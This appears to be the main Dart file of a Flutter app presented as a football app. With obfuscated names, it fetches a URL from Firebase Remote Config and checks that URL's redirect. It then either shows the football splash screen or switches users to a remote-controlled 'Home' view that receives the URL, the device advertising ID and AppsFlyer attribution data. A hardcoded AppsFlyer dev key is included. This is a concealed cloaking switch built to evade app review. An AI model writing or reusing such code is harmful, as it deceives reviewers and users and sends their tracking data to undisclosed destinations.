import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:football_app/features/splash/splash_screen.dart';

import 'global_navigator/global_navigator.dart';

late AppsflyerSdk _appsflyerSdk;
String adId = '';
bool stat = false;
String acceptPromo = '';
String cancelPromo = '';
String datioq = '';
String appsflyerId = '';
String ndjasnjda = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _campaign = '';
String _campaignId = '';

class FootballApp extends StatefulWidget {
  const FootballApp({super.key});

  @override
  State<FootballApp> createState() => _FootballAppState();
}

Future<String> fmksdl() async {
  String njdkasdjksa = await AppTrackingTransparency.getAdvertisingIdentifier();
  ndjasnjda = njdkasdjksa;
  return njdkasdjksa;
}

Future<void> dares() async {
  await fmksdl();
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'gW8agzqPttztGYg7qrtGeL',
    appId: '6618147198',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    cancelPromo = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });

  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    acceptPromo = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    _deepLinkData = dp.toJson();
  });
  _appsflyerSdk.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

String fsdfds = '';
String dsahjf = '';
String fdsfsd = '';
String fgfdgdf = '';
Future<bool> fethcxa() async {
  final dasdsa = FirebaseRemoteConfig.instance;
  await dasdsa.fetchAndActivate();
  String dsaif = dasdsa.getString('mode');
  String modas = dasdsa.getString('dan');
  fgfdgdf = modas;
  await dares();
  final sadsadas = HttpClient();
  final gretre = Uri.parse(dsaif);
  final ndsfjak = await sadsadas.getUrl(gretre);
  ndsfjak.followRedirects = false;
  final response = await ndsfjak.close();
  if (response.headers.value(HttpHeaders.locationHeader) != fgfdgdf) {
    datioq = dsaif;
    return true;
  }
  return dsaif.contains('modes') ? false : true;
}

class _FootballAppState extends State<FootballApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<bool>(
          future: fethcxa(),
          builder: (context, snapshot) {
            if (snapshot.connectionState == ConnectionState.waiting) {
              return Container(
                color: Colors.white,
              );
            } else {
              if (snapshot.data == true && datioq != '') {
                return Home(
                  parnfjksdfsdms: datioq,
                  njfksdfsd: acceptPromo,
                  njkfsmfsdsdflds: fdsfsd,
                );
              } else {
                return const SplashScreen();
              }
            }
          }),
    );
  }
}
